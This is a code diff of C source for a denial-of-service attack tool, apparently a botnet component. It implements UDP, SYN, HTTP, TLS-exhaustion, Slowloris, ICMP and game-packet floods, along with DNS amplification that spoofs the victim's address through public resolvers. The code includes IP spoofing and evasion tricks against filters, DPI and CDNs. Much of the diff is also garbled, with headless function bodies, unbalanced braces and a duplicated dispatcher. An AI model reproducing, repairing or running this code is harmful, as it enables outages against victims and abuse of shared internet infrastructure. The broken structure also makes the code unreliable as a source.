@@ -15,7 +15,7 @@ static int resolve_target(const char *host, struct in_addr *out)
     return 0;
 }
 
-/* Non-blocking TCP connect with poll() Ã¢â‚¬â€ fixes all TCP methods */
+/* Non-blocking TCP connect with poll() — fixes all TCP methods */
 static int tcp_connect_wait(int fd, const struct sockaddr_in *addr, int timeout_ms)
 {
     int fl = fcntl(fd, F_GETFL, 0);
@@ -57,7 +57,7 @@ static int safe_sendmmsg(int fd, struct mmsghdr *msgvec, unsigned int vlen, int 
     return r;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ Token Bucket Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */
+/* ── Token Bucket ────────────────────────────────── */
 static void tb_init(TokenBucket *tb, double r, double b) {
     if (r < 1) r = 1; if (b < r) b = r;
     tb->rate = r; tb->burst = b; tb->tokens = b;
@@ -79,17 +79,14 @@ static int tb_consume(TokenBucket *tb, int n) {
     return ok;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ Attack worker dispatch Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */
-typedef struct { AttackParams *ap; TokenBucket *tb; struct sockaddr_in ta; int cpu; } WorkerArg;
+/* ── Attack worker dispatch ──────────────────────── */
 
-static void *attack_worker(void *arg) {
-    WorkerArg *x = (WorkerArg *)arg;
     /* cpu affinity handled in dispatcher, method dispatch below kept for reference */
     free(x->ap); free(x->tb); free(x);
     return NULL;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ MEGA UDP Engine (primary Ã¢â‚¬â€ sendmmsg + multi-port + real payloads) Ã¢â€â‚¬Ã¢â€â‚¬ */
+/* ── MEGA UDP Engine (primary — sendmmsg + multi-port + real payloads) ── */
 typedef struct {
     int *socks; int sock_count; struct sockaddr_in target;
     int port_base; int duration; int cpu_id; char host[256];
@@ -144,7 +141,7 @@ static void *mega_worker(void *arg) {
         return NULL;
     }
 
-    /* Fill ring Ã¢â‚¬â€ 67% real/pattern payloads for DPI evasion */
+    /* Fill ring — 67% real/pattern payloads for DPI evasion */
     for (int i = 0; i < batch; i++) {
         unsigned char *slot = ring + (size_t)i * MEGA_PAYLOAD;
         if (g_total_payloads > 0 && (i % 3) != 0) {
@@ -198,7 +195,7 @@ static void *mega_worker(void *arg) {
                 p[rand_r(&seed) % MEGA_PAYLOAD] ^= (unsigned char)rand_r(&seed);
             }
 
-            /* Single sendmmsg call Ã¢â‚¬â€ fills TX queue, no wasted iterations */
+            /* Single sendmmsg call — fills TX queue, no wasted iterations */
             int r = safe_sendmmsg(mt->socks[si], msgs, (unsigned int)batch, flags);
             if (r > 0) {
                 pkt_sent(r * MEGA_PAYLOAD);
@@ -225,7 +222,7 @@ static void *mega_worker(void *arg) {
     return NULL;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ SYN Flood (fixed: TCP options, real src IP, no spoofing) Ã¢â€â‚¬Ã¢â€â‚¬ */
+/* ── SYN Flood (fixed: TCP options, real src IP, no spoofing) ── */
 static void *syn_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
     int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
@@ -295,7 +292,7 @@ static void *syn_worker(void *arg) {
     return NULL;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ TLS Exhaust (fixed: poll-based connect, full handshake, 2000+ pool) Ã¢â€â‚¬Ã¢â€â‚¬ */
+/* ── TLS Exhaust (fixed: poll-based connect, full handshake, 2000+ pool) ── */
 #define TLS_POOL 2048
 static void *tls_exhaust_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
@@ -334,11 +331,11 @@ static void *tls_exhaust_worker(void *arg) {
             if (r <= 0) {
                 int e = SSL_get_error(ssl, r);
                 if (e == SSL_ERROR_WANT_READ || e == SSL_ERROR_WANT_WRITE) {
-                    /* Handshake started but not complete Ã¢â‚¬â€ connection held mid-handshake */
+                    /* Handshake started but not complete — connection held mid-handshake */
                     /* Track in pool so we don't close it */
                 }
             }
-            /* Keep connection Ã¢â‚¬â€ mid-handshake or partial */
+            /* Keep connection — mid-handshake or partial */
             socks[pool] = s;
             pool++;
             pkt_sent(512);
@@ -388,7 +385,7 @@ static void *tls_exhaust_worker(void *arg) {
     return NULL;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ HTTP Flood (fixed: poll-based connect, TLS, real requests) Ã¢â€â‚¬Ã¢â€â‚¬ */
+/* ── HTTP Flood (fixed: poll-based connect, TLS, real requests) ── */
 #define HTTP_POOL 256
 static void *http_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
@@ -449,7 +446,7 @@ static void *http_worker(void *arg) {
     return NULL;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ Slowloris (fixed: poll-based connect, CDN-bypass, variable drip) Ã¢â€â‚¬Ã¢â€â‚¬ */
+/* ── Slowloris (fixed: poll-based connect, CDN-bypass, variable drip) ── */
 #define SLOW_POOL 512
 static void *slowloris_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
@@ -541,7 +538,7 @@ static void *slowloris_worker(void *arg) {
     return NULL;
 }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ DNS Amplification (fixed: TXT/MX queries, no spoofing, real protocol) Ã¢â€â‚¬Ã¢â€â‚¬ */
+/* ── DNS Amplification (fixed: TXT/MX queries, no spoofing, real protocol) ── */
 #define DNS_POOL 64
 static void *dns_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
@@ -615,9 +612,8 @@ static void *dns_worker(void *arg) {
     return NULL;
 }
 
-static uint16_t icmp_csum(void *d, size_t l) { return ip_csum(d, l); }
 
-/* Ã¢â€â‚¬Ã¢â€â‚¬ Background Attack Thread Dispatcher Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */
+/* ── Background Attack Thread Dispatcher ─────────── */
 static void *dispatch_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
     switch (mt->cpu_id) {
@@ -665,7 +661,7 @@ void *bg_attack_thread(void *arg)
         long free_mb = 512;
         if (sysinfo(&si) == 0) free_mb = (long)(si.freeram / (1024 * 1024));
         int max_sk = cores * MEGA_SOCKS_PER_CPU;
-        int ram_cap = (int)(free_mb / 1); /* 1MB per socket — max count */
+        int ram_cap = (int)(free_mb / 2); /* ~2MB per socket */
         if (ram_cap < 8) ram_cap = 8;
         if (max_sk > ram_cap) max_sk = ram_cap;
         if (max_sk > MEGA_MAX_SOCKS) max_sk = MEGA_MAX_SOCKS;
@@ -730,7 +726,7 @@ void *bg_attack_thread(void *arg)
         for (int i = 0; i < sock_cnt; i++) close(socks[i]);
         free(socks); free(tids); free(mt);
     }
-    /* SYN / TLS / HTTP / SLOWLORIS / DNS Ã¢â‚¬â€ one worker per core, shared target */
+    /* SYN / TLS / HTTP / SLOWLORIS / DNS — one worker per core, shared target */
     else {
         struct sockaddr_in ta;
         memset(&ta, 0, sizeof(ta));
@@ -777,6 +773,655 @@ void *bg_attack_thread(void *arg)
         free(tids); free(mt);
     }
 
+    fprintf(stderr, "[atk] DONE pkts=%llu bytes=%llu\n", g_pkt_count, g_byte_count);
+    g_attack_active = 0;
+    free(ctx);
+    return NULL;
+}
+            if (len > MAX_PAYLOAD) len = MAX_PAYLOAD;
+            memcpy(slot, g_payloads[idx], (size_t)len);
+        } else {
+            for (int j = 0; j < len; j++) slot[j] = (unsigned char)rand_r(&seed);
+        }
+        iovs[i].iov_base = slot;
+        iovs[i].iov_len = (size_t)len;
+        msgs[i].msg_hdr.msg_iov = &iovs[i];
+        msgs[i].msg_hdr.msg_iovlen = 1;
+        msgs[i].msg_hdr.msg_name = &ta;
+        msgs[i].msg_hdr.msg_namelen = sizeof(ta);
+    }
+
+    int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
+    while (p->duration_secs && !g_attack_stop) {
+        if (!tb_consume(tb, batch)) { usleep(20); continue; }
+        if (should_pause()) { usleep(200); continue; }
+        for (int si = 0; si < nsk && !g_attack_stop; si++) {
+            int r = safe_sendmmsg(socks[si], (struct mmsghdr *)msgs, (unsigned int)batch, flags);
+            if (r > 0) {
+                int bytes = 0;
+                for (int k = 0; k < r; k++) bytes += (int)iovs[k].iov_len;
+                pkt_sent(bytes);
+            }
+        }
+        /* Mutate one slot per loop — anti signature */
+        int slot = (int)(rand_r(&seed) % batch);
+        ((unsigned char *)iovs[slot].iov_base)[rand_r(&seed) % iovs[slot].iov_len] ^= 0xA5;
+    }
+    free(ring); free(msgs); free(iovs);
+    for (int i = 0; i < nsk; i++) close(socks[i]);
+}
+
+{
+    int s = create_raw_socket(IPPROTO_TCP);
+    if (s < 0) return;
+    struct { struct iphdr ip; struct tcphdr tcp; } pkt;
+    memset(&pkt, 0, sizeof(pkt));
+    pkt.ip.version = 4; pkt.ip.ihl = 5;
+    pkt.ip.tot_len = htons(sizeof(pkt));
+    pkt.ip.protocol = IPPROTO_TCP;
+    pkt.ip.daddr = ta.sin_addr.s_addr;
+    pkt.tcp.dest = htons((uint16_t)p->port);
+    pkt.tcp.doff = 5;
+    pkt.tcp.window = htons(65535);
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+    struct sockaddr_in sin = ta;
+    sin.sin_port = htons((uint16_t)p->port);
+
+    while (p->duration_secs && !g_attack_stop) {
+        if (should_pause()) { usleep(200); continue; }
+            pkt.ip.id = htons((uint16_t)rand_r(&seed));
+            pkt.ip.saddr = (p->spoof_mode == 1) ? rand_vn_ip()
+                         : (p->spoof_mode == 2) ? rand_r(&seed) : rand_vn_ip();
+            pkt.ip.ttl = 48 + (rand_r(&seed) % 80);
+            pkt.ip.frag_off = (p->fragmentation && (rand_r(&seed) % 5) == 0)
+                              ? htons(0x2000 | (rand_r(&seed) % 64)) : 0;
+            /* Mix SYN / SYN+ACK / RST for filter bypass */
+            pkt.tcp.syn = 1; pkt.tcp.ack = 0; pkt.tcp.rst = 0;
+            int fl = rand_r(&seed) % 10;
+            if (fl == 0) { pkt.tcp.ack = 1; }
+            else if (fl == 1) { pkt.tcp.rst = 1; pkt.tcp.syn = 0; }
+            pkt.tcp.source = htons((uint16_t)(1024 + (rand_r(&seed) % 64511)));
+            pkt.tcp.seq = htonl(rand_r(&seed));
+            pkt.tcp.ack_seq = pkt.tcp.ack ? htonl(rand_r(&seed)) : 0;
+            pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
+            pkt.tcp.check = 0; pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
+            if (sendto(s, &pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
+                pkt_sent((int)sizeof(pkt));
+        }
+    }
+    close(s);
+}
+
+{
+    /* Pool of half-open + data-blast sockets */
+    const int pool = 64;
+    int socks[64];
+    int n = 0;
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+    char junk[1024];
+    for (int i = 0; i < 1024; i++) junk[i] = (char)(rand_r(&seed) & 0xFF);
+
+    while (p->duration_secs && !g_attack_stop) {
+        if (!tb_consume(tb, 32)) { usleep(50); continue; }
+        if (should_pause()) { usleep(200); continue; }
+
+        /* Open new non-block connects */
+        for (int b = 0; b < 32 && n < pool && !g_attack_stop; b++) {
+            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (s < 0) continue;
+            int f = 1;
+            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &f, sizeof(f));
+            fcntl(s, F_SETFL, O_NONBLOCK);
+            connect(s, (struct sockaddr *)&ta, sizeof(ta));
+            socks[n++] = s;
+            pkt_sent(64);
+        }
+        /* Blast data on existing, recycle dead */
+        for (int i = 0; i < n; i++) {
+            ssize_t w = send(socks[i], junk, sizeof(junk), MSG_DONTWAIT | MSG_NOSIGNAL);
+            if (w > 0) pkt_sent((int)w);
+            else if (w < 0 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EINPROGRESS) {
+                close(socks[i]);
+                socks[i] = socks[--n];
+                i--;
+            }
+        }
+        /* Cap pool — close oldest */
+        while (n > pool / 2) {
+            close(socks[--n]);
+        }
+    }
+    for (int i = 0; i < n; i++) close(socks[i]);
+}
+
+{
+    const int pool = 32;
+    int socks[32];
+    int alive[32];
+    int n = 0;
+    memset(alive, 0, sizeof(alive));
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+
+    while (p->duration_secs && !g_attack_stop) {
+        if (!tb_consume(tb, 16)) { usleep(50); continue; }
+        if (should_pause()) { usleep(200); continue; }
+
+        /* Open new */
+        for (int b = 0; b < 8 && n < pool && !g_attack_stop; b++) {
+            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (s < 0) continue;
+            int f = 1;
+            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &f, sizeof(f));
+            fcntl(s, F_SETFL, O_NONBLOCK);
+            connect(s, (struct sockaddr *)&ta, sizeof(ta));
+            socks[n] = s; alive[n] = 1; n++;
+        }
+        /* Pipeline multiple requests per socket */
+        for (int i = 0; i < n && !g_attack_stop; i++) {
+            if (!alive[i]) continue;
+            for (int r = 0; r < 4; r++) {
+                unsigned char buf[2048];
+                int len = 0;
+                gen_http(buf, &len, p->target);
+                ssize_t w = send(socks[i], buf, (size_t)len, MSG_DONTWAIT | MSG_NOSIGNAL);
+                if (w > 0) pkt_sent((int)w);
+                else if (w < 0 && errno != EAGAIN && errno != EWOULDBLOCK && errno != EINPROGRESS) {
+                    close(socks[i]); alive[i] = 0;
+                    break;
+                }
+            }
+        }
+        /* Compact dead */
+        int w = 0;
+        for (int i = 0; i < n; i++) {
+            if (alive[i]) { socks[w] = socks[i]; alive[w] = 1; w++; }
+        }
+        n = w;
+        /* Random recycle to avoid idle timeout on target */
+        if (n > 0 && (rand_r(&seed) % 20) == 0) {
+            close(socks[n - 1]); n--;
+        }
+    }
+    for (int i = 0; i < n; i++) close(socks[i]);
+}
+
+{
+    const int maxc = 800;
+    int *socks = calloc((size_t)maxc, sizeof(int));
+    if (!socks) return;
+    int cnt = 0;
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+    time_t last_drip = time(NULL);
+
+    /* Warm pool fast */
+    for (int i = 0; i < maxc && p->duration_secs && !g_attack_stop; i++) {
+        if (!tb_consume(tb, 1)) { usleep(1000); continue; }
+        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (s < 0) continue;
+        int ka = 1;
+        setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &ka, sizeof(ka));
+        fcntl(s, F_SETFL, O_NONBLOCK);
+        connect(s, (struct sockaddr *)&ta, sizeof(ta));
+        char ph[640];
+        snprintf(ph, sizeof(ph),
+                 "GET /?%u HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n"
+                 "Accept: */*\r\nAccept-Language: en-US,en;q=0.9\r\n"
+                 "Connection: keep-alive\r\n",
+                 rand_r(&seed), p->target);
+        send(s, ph, strlen(ph), MSG_DONTWAIT | MSG_NOSIGNAL);
+        socks[cnt++] = s;
+        if ((i & 0x1F) == 0) usleep(1000);
+    }
+
+    while (p->duration_secs && !g_attack_stop) {
+        time_t now = time(NULL);
+        /* Drip headers every 5–15s (classic slowloris) */
+        if (now - last_drip >= 5) {
+            last_drip = now;
+            for (int i = 0; i < cnt && !g_attack_stop; i++) {
+                char h[128];
+                snprintf(h, sizeof(h), "X-a%u: %u\r\n", rand_r(&seed) % 99999, rand_r(&seed));
+                ssize_t w = send(socks[i], h, strlen(h), MSG_DONTWAIT | MSG_NOSIGNAL);
+                if (w > 0) pkt_sent((int)w);
+                else if (w < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
+                    close(socks[i]);
+                    socks[i] = socks[--cnt];
+                    i--;
+                }
+            }
+        }
+        /* Replenish */
+        while (cnt < maxc && p->duration_secs && !g_attack_stop) {
+            if (!tb_consume(tb, 1)) break;
+            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (s < 0) break;
+            fcntl(s, F_SETFL, O_NONBLOCK);
+            connect(s, (struct sockaddr *)&ta, sizeof(ta));
+            char ph[512];
+            snprintf(ph, sizeof(ph), "POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 1000000\r\n", p->target);
+            send(s, ph, strlen(ph), MSG_DONTWAIT | MSG_NOSIGNAL);
+            socks[cnt++] = s;
+        }
+        usleep(200000);
+    }
+    for (int i = 0; i < cnt; i++) close(socks[i]);
+    free(socks);
+}
+
+void tls_exhaust(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
+{
+    /* Hold many sockets mid-handshake to exhaust TLS workers */
+    const int pool = 128;
+    int socks[128];
+    int n = 0;
+
+    while (p->duration_secs && !g_attack_stop) {
+        if (!tb_consume(tb, 16)) { usleep(50); continue; }
+        if (should_pause()) { usleep(200); continue; }
+
+        for (int b = 0; b < 16 && n < pool && !g_attack_stop; b++) {
+            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (s < 0) continue;
+            fcntl(s, F_SETFL, O_NONBLOCK);
+            connect(s, (struct sockaddr *)&ta, sizeof(ta));
+            unsigned char buf[1024];
+            int len = 0;
+            gen_tls_hello(buf, &len, p->target);
+            send(s, buf, (size_t)len, MSG_DONTWAIT | MSG_NOSIGNAL);
+            socks[n++] = s;
+            pkt_sent(len);
+        }
+        /* Occasionally drop half to free FD and reopen */
+        if (n >= pool) {
+            for (int i = 0; i < n / 2; i++) close(socks[i]);
+            memmove(socks, socks + n / 2, (size_t)(n - n / 2) * sizeof(int));
+            n -= n / 2;
+        }
+    }
+    for (int i = 0; i < n; i++) close(socks[i]);
+}
+
+{
+    /* Open resolvers (VN + global) — spoof source = victim */
+    static const char *dns_svrs[] = {
+        "203.162.4.1", "203.113.131.1", "210.245.0.11", "210.245.0.12",
+        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
+        "9.9.9.9", "208.67.222.222", "64.6.64.6", "94.140.14.14",
+        "185.228.168.9", "76.76.2.0", "4.2.2.1", "4.2.2.2",
+    };
+    const int nsrv = (int)(sizeof(dns_svrs) / sizeof(dns_svrs[0]));
+    int s = create_raw_socket(IPPROTO_UDP);
+    if (s < 0) {
+        /* Fallback: plain UDP without spoof (less amp but still hits resolvers) */
+        s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if (s < 0) return;
+        int bs = 4 * 1024 * 1024;
+        setsockopt(s, SOL_SOCKET, SO_SNDBUF, &bs, sizeof(bs));
+        unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+        while (p->duration_secs && !g_attack_stop) {
+            if (!tb_consume(tb, 64)) { usleep(20); continue; }
+            for (int b = 0; b < 64 && !g_attack_stop; b++) {
+                struct sockaddr_in sin = {0};
+                sin.sin_family = AF_INET;
+                sin.sin_port = htons(53);
+                inet_pton(AF_INET, dns_svrs[rand_r(&seed) % nsrv], &sin.sin_addr);
+                if (sendto(s, DNS_ANY_PAYLOAD, DNS_ANY_LEN, MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
+                    pkt_sent((int)DNS_ANY_LEN);
+            }
+        }
+        close(s);
+        return;
+    }
+
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+    while (p->duration_secs && !g_attack_stop) {
+        if (!tb_consume(tb, 128)) { usleep(20); continue; }
+        if (should_pause()) { usleep(200); continue; }
+        for (int b = 0; b < 128 && !g_attack_stop; b++) {
+            const char *dip = dns_svrs[rand_r(&seed) % nsrv];
+            struct { struct iphdr ip; struct udphdr udp; unsigned char d[64]; } pkt;
+            memset(&pkt, 0, sizeof(pkt));
+            size_t tl = sizeof(struct iphdr) + sizeof(struct udphdr) + DNS_ANY_LEN;
+            pkt.ip.version = 4; pkt.ip.ihl = 5;
+            pkt.ip.tot_len = htons((uint16_t)tl);
+            pkt.ip.id = htons((uint16_t)rand_r(&seed));
+            pkt.ip.ttl = 64; pkt.ip.protocol = IPPROTO_UDP;
+            pkt.ip.saddr = ta.sin_addr.s_addr; /* spoof = victim */
+            inet_pton(AF_INET, dip, &pkt.ip.daddr);
+            pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
+            pkt.udp.source = htons((uint16_t)(1024 + rand_r(&seed) % 60000));
+            pkt.udp.dest = htons(53);
+            pkt.udp.len = htons((uint16_t)(sizeof(struct udphdr) + DNS_ANY_LEN));
+            pkt.udp.check = 0;
+            memcpy(pkt.d, DNS_ANY_PAYLOAD, DNS_ANY_LEN);
+            /* Randomize DNS TXID */
+            pkt.d[0] = (unsigned char)(rand_r(&seed) & 0xFF);
+            pkt.d[1] = (unsigned char)(rand_r(&seed) & 0xFF);
+            struct sockaddr_in sin = {0};
+            sin.sin_family = AF_INET;
+            sin.sin_port = htons(53);
+            sin.sin_addr.s_addr = pkt.ip.daddr;
+            if (sendto(s, &pkt, tl, MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin)) > 0)
+                pkt_sent((int)tl);
+        }
+    }
+    close(s);
+}
+
+{
+    int nsk = 0;
+        int s = create_udp_socket();
+        if (s >= 0) socks[nsk++] = s;
+    }
+    if (nsk < 1) return;
+
+    unsigned char buf[512];
+    int len = 0;
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+    while (p->duration_secs && !g_attack_stop) {
+        if (!tb_consume(tb, 64)) { usleep(20); continue; }
+        if (should_pause()) { usleep(200); continue; }
+        for (int b = 0; b < 64 && !g_attack_stop; b++) {
+            gen_game_pkt(buf, &len);
+            /* Pad to larger size for bandwidth */
+            int pad = 64 + (int)(rand_r(&seed) % 200);
+            if (len + pad > (int)sizeof(buf)) pad = (int)sizeof(buf) - len;
+            for (int j = 0; j < pad; j++) buf[len + j] = (unsigned char)rand_r(&seed);
+            len += pad;
+            int s = socks[rand_r(&seed) % nsk];
+            if (sendto(s, buf, (size_t)len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
+                pkt_sent(len);
+        }
+    }
+    for (int i = 0; i < nsk; i++) close(socks[i]);
+}
+
+{
+    int s = create_raw_socket(IPPROTO_ICMP);
+    if (s < 0) return;
+    unsigned char icmp[1200];
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+    uint16_t seq = 0;
+
+    while (p->duration_secs && !g_attack_stop) {
+        if (!tb_consume(tb, 128)) { usleep(20); continue; }
+        if (should_pause()) { usleep(200); continue; }
+        for (int b = 0; b < 128 && !g_attack_stop; b++) {
+            int plen = 64 + (int)(rand_r(&seed) % 1100);
+            memset(icmp, 0, (size_t)plen);
+            icmp[0] = 8; /* echo request */
+            icmp[1] = 0;
+            icmp[4] = (unsigned char)((seq >> 8) & 0xFF);
+            icmp[5] = (unsigned char)(seq & 0xFF);
+            seq++;
+            for (int j = 8; j < plen; j++) icmp[j] = (unsigned char)rand_r(&seed);
+            icmp[2] = icmp[3] = 0;
+            uint16_t c = icmp_csum(icmp, (size_t)plen);
+            icmp[2] = (unsigned char)(c & 0xFF);
+            icmp[3] = (unsigned char)((c >> 8) & 0xFF);
+            if (sendto(s, icmp, (size_t)plen, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
+                pkt_sent(plen);
+        }
+    }
+    close(s);
+}
+
+{
+    int us = create_udp_socket();
+    int rs = create_raw_socket(IPPROTO_TCP);
+    if (us < 0) {
+        if (rs >= 0) close(rs);
+        return;
+    }
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+    unsigned char big[MAX_PAYLOAD];
+
+    while (p->duration_secs && !g_attack_stop) {
+        if (!tb_consume(tb, 64)) { usleep(20); continue; }
+        if (should_pause()) { usleep(200); continue; }
+        for (int b = 0; b < 64 && !g_attack_stop; b++) {
+            int c = rand_r(&seed) % 8;
+            if (c <= 2) {
+                /* Heavy UDP — majority of mix */
+                int len = 800 + (int)(rand_r(&seed) % 600);
+                if (g_total_payloads > 0) {
+                    int idx = rand_r(&seed) % g_total_payloads;
+                    int pl = g_payload_lens[idx];
+                    if (pl > MAX_PAYLOAD) pl = MAX_PAYLOAD;
+                    memcpy(big, g_payloads[idx], (size_t)pl);
+                    for (int j = pl; j < len; j++) big[j] = (unsigned char)rand_r(&seed);
+                } else {
+                    for (int j = 0; j < len; j++) big[j] = (unsigned char)rand_r(&seed);
+                }
+                if (sendto(us, big, (size_t)len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
+                    pkt_sent(len);
+            } else if (c == 3 && rs >= 0) {
+                struct { struct iphdr ip; struct tcphdr tcp; } pkt;
+                memset(&pkt, 0, sizeof(pkt));
+                pkt.ip.version = 4; pkt.ip.ihl = 5;
+                pkt.ip.tot_len = htons(sizeof(pkt));
+                pkt.ip.id = htons((uint16_t)rand_r(&seed));
+                pkt.ip.ttl = 50 + (rand_r(&seed) % 74);
+                pkt.ip.protocol = IPPROTO_TCP;
+                pkt.ip.saddr = (p->spoof_mode >= 1) ? rand_vn_ip() : rand_r(&seed);
+                pkt.ip.daddr = ta.sin_addr.s_addr;
+                pkt.tcp.source = htons((uint16_t)(1024 + (rand_r(&seed) % 64511)));
+                pkt.tcp.dest = htons((uint16_t)p->port);
+                pkt.tcp.seq = htonl(rand_r(&seed));
+                pkt.tcp.doff = 5; pkt.tcp.syn = 1;
+                pkt.tcp.window = htons(65535);
+                pkt.ip.check = 0; pkt.ip.check = ip_csum(&pkt.ip, sizeof(struct iphdr));
+                pkt.tcp.check = 0; pkt.tcp.check = tcp_csum(&pkt.ip, &pkt.tcp);
+                if (sendto(rs, &pkt, sizeof(pkt), MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
+                    pkt_sent((int)sizeof(pkt));
+            } else if (c == 4) {
+                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                if (s >= 0) {
+                    fcntl(s, F_SETFL, O_NONBLOCK);
+                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
+                    unsigned char buf[2048]; int len = 0;
+                    gen_http(buf, &len, p->target);
+                    send(s, buf, (size_t)len, MSG_DONTWAIT | MSG_NOSIGNAL);
+                    close(s); pkt_sent(len);
+                }
+            } else if (c == 5) {
+                unsigned char buf[512]; int len = 0;
+                gen_game_pkt(buf, &len);
+                if (sendto(us, buf, (size_t)len, MSG_DONTWAIT, (struct sockaddr *)&ta, sizeof(ta)) > 0)
+                    pkt_sent(len);
+            } else if (c == 6) {
+                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                if (s >= 0) {
+                    fcntl(s, F_SETFL, O_NONBLOCK);
+                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
+                    unsigned char buf[1024]; int len = 0;
+                    gen_tls_hello(buf, &len, p->target);
+                    send(s, buf, (size_t)len, MSG_DONTWAIT | MSG_NOSIGNAL);
+                    close(s); pkt_sent(len);
+                }
+            } else {
+                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                if (s >= 0) {
+                    fcntl(s, F_SETFL, O_NONBLOCK);
+                    connect(s, (struct sockaddr *)&ta, sizeof(ta));
+                    close(s); pkt_sent(64);
+                }
+            }
+        }
+    }
+    close(us);
+    if (rs >= 0) close(rs);
+}
+
+/* ── Background Attack Thread ───────────────────────── */
+void *bg_attack_thread(void *arg)
+{
+    BgAttackCtx *ctx = (BgAttackCtx *)arg;
+    if (!ctx) return NULL;
+    AttackParams *atk = &ctx->atk;
+    if (atk->duration_secs <= 0) atk->duration_secs = 60;
+    if (atk->port <= 0 || atk->port > 65535) atk->port = 80;
+    if (!atk->target[0]) { free(ctx); return NULL; }
+
+    time_t deadline = time(NULL) + atk->duration_secs;
+    g_attack_active = 1;
+    g_attack_stop = 0;
+    g_pkt_count = 0;
+    g_byte_count = 0;
+
+    fprintf(stderr, "[atk] START method=%s target=%s:%d dur=%ds pps=%u mega=%u\n",
+            atk->method, atk->target, atk->port, atk->duration_secs,
+            atk->max_pps, atk->mega_mode);
+
